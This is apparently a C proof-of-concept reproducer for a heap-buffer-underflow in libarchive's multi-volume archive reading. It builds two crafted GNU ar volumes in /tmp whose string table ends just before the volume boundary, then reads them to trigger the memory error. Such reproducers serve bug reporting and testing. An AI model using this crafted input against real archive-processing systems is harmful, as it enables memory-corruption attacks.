/*
 * PoC: heap-buffer-underflow in the client/copy buffer roll-back logic
 * of the archive read filter, reached through archive_read_open_filenames
 * on a GNU ar archive whose string-table entry ends one byte before the
 * end of the first volume.
 */
#include <archive.h>
#include <archive_entry.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void
put_field(char *p, size_t size, const char *text)
{
	size_t len = strlen(text);

	memset(p, ' ', size);
	memcpy(p, text, len);
}

static void
write_file(const char *path, const unsigned char *data, size_t size)
{
	FILE *f = fopen(path, "wb");

	if (f == NULL) {
		perror(path);
		exit(1);
	}
	if (fwrite(data, 1, size, f) != size) {
		perror(path);
		exit(1);
	}
	fclose(f);
}

int
main(void)
{
	static const char *names[3] =
		{ "/tmp/libarchive_newbug_aa", "/tmp/libarchive_newbug_ab", NULL };
	unsigned char vol1[6999];
	unsigned char vol2[100];
	struct archive *a;
	struct archive_entry *ae;
	int r;

	/* Volume 1: global header, GNU string table member, one spare byte. */
	memset(vol1, '\n', sizeof(vol1));
	memcpy(vol1, "!<arch>\n", 8);
	put_field((char *)vol1 + 8, 16, "//");
	put_field((char *)vol1 + 8 + 16, 12, "0");
	put_field((char *)vol1 + 8 + 28, 6, "0");
	put_field((char *)vol1 + 8 + 34, 6, "0");
	put_field((char *)vol1 + 8 + 40, 8, "0");
	put_field((char *)vol1 + 8 + 48, 10, "6930");
	memcpy(vol1 + 8 + 58, "`\n", 2);
	for (size_t i = 68; i + 3 <= 68 + 6930; i += 3)
		memcpy(vol1 + i, "n/\n", 3);
	vol1[68 + 6930 - 1] = '\n';

	/* Volume 2: continuation with a second member header. */
	memset(vol2, '\n', sizeof(vol2));
	put_field((char *)vol2, 16, "member/");
	put_field((char *)vol2 + 16, 12, "0");
	put_field((char *)vol2 + 28, 6, "0");
	put_field((char *)vol2 + 34, 6, "0");
	put_field((char *)vol2 + 40, 8, "0");
	put_field((char *)vol2 + 48, 10, "10");
	memcpy(vol2 + 57, "`\n", 2);
	memcpy(vol2 + 60, "0123456789", 10);

	write_file(names[0], vol1, sizeof(vol1));
	write_file(names[1], vol2, sizeof(vol2));

	a = archive_read_new();
	if (a == NULL)
		return (1);
	archive_read_support_format_ar(a);
	if (archive_read_open_filenames(a, names, 10240) != ARCHIVE_OK) {
		fprintf(stderr, "open: %s\n", archive_error_string(a));
		archive_read_free(a);
		return (1);
	}

	r = archive_read_next_header(a, &ae);
	fprintf(stderr, "first header: %d (%s)\n", r,
	    archive_error_string(a) ? archive_error_string(a) : "-");
	if (r != ARCHIVE_OK) {
		archive_read_free(a);
		return (1);
	}

	/* The second header read crosses the volume boundary. */
	r = archive_read_next_header(a, &ae);
	fprintf(stderr, "second header: %d (%s)\n", r,
	    archive_error_string(a) ? archive_error_string(a) : "-");

	archive_read_close(a);
	archive_read_free(a);
	return (0);
}
